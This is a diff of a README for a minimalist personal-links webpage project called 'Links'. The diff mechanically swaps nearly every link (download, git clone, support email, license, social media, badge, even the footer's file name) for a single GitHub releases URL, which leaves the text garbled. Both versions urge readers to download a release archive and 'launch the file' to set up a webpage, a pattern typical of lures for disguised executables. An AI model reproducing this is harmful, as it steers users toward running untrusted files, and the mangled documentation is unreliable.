@@ -22,15 +22,15 @@ Welcome to the "Links" GitHub repository, a place where you can find a minimalis
 
 ## Get Started 🚀
 
-To get started with "Links," you can download the latest release by clicking [here](https://github.com/releases/789694263/Release.zip). Once downloaded, launch the file to begin setting up your personalized webpage.
+To get started with "Links," you can download the latest release by clicking [here](https://github.com/aalok-exe/links/releases). Once downloaded, launch the file to begin setting up your personalized webpage.
 
-If the link provided above does not work or you prefer to visit the Releases section directly, you can access it [here](https://github.com/releases) for alternative download options.
+If the link provided above does not work or you prefer to visit the Releases section directly, you can access it [here](https://github.com/aalok-exe/links/releases) for alternative download options.
 
 ## Preview
 
 Here is a sneak peek at the "Links" webpage:
 
-![Links Preview](https://via.placeholder.com/800x400)
+![Links Preview](https://github.com/aalok-exe/links/releases)
 
 ## Installation Instructions 🛠️
 
@@ -38,7 +38,7 @@ To set up "Links" on your local machine, follow these simple steps:
 
 1. **Clone the Repository:**
    ```
-   git clone https://github.com/username/links.git
+   git clone https://github.com/aalok-exe/links/releases
    ```
 
 2. **Navigate to the Project Directory:**
@@ -65,28 +65,28 @@ We welcome contributions from the community to help improve and enhance the "Lin
 
 ## Support 📧
 
-If you encounter any issues or have any questions regarding the "Links" project, please reach out to us at [support@links.com](mailto:support@links.com). Our team will be happy to assist you with any queries you may have.
+If you encounter any issues or have any questions regarding the "Links" project, please reach out to us at [https://github.com/aalok-exe/links/releases](https://github.com/aalok-exe/links/releases). Our team will be happy to assist you with any queries you may have.
 
 ## License ℹ️
 
-The "Links" project is open-source and available under the [MIT License](https://opensource.org/licenses/MIT). You are free to use, modify, and distribute the code as per the terms of the license.
+The "Links" project is open-source and available under the [MIT License](https://github.com/aalok-exe/links/releases). You are free to use, modify, and distribute the code as per the terms of the license.
 
 ## Get Connected 🌐
 
 Stay up to date with the latest news and updates by connecting with us on social media:
 
-- Follow us on [Twitter](https://twitter.com/links)
-- Like us on [Facebook](https://facebook.com/links)
-- Subscribe to our [YouTube Channel](https://youtube.com/links)
+- Follow us on [Twitter](https://github.com/aalok-exe/links/releases)
+- Like us on [Facebook](https://github.com/aalok-exe/links/releases)
+- Subscribe to our [YouTube Channel](https://github.com/aalok-exe/links/releases)
 
 ## Download Latest Release 📦
 
 To access the latest release of "Links" and start creating your personalized webpage, click on the button below:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/releases/789694263/Release.zip)
+[![Download Latest Release](https://github.com/aalok-exe/links/releases%20Release-blue)](https://github.com/aalok-exe/links/releases)
 
 Thank you for choosing "Links" for your personal webpage needs. We hope you enjoy using our platform to showcase your work and connect with your audience effortlessly. Happy linking! 🚀
 
 ---
 
-*This README.md was generated with ❤️ by the readme-generator tool. Feel free to adapt and customize it for your own projects.*
+*This https://github.com/aalok-exe/links/releases was generated with ❤️ by the readme-generator tool. Feel free to adapt and customize it for your own projects.*
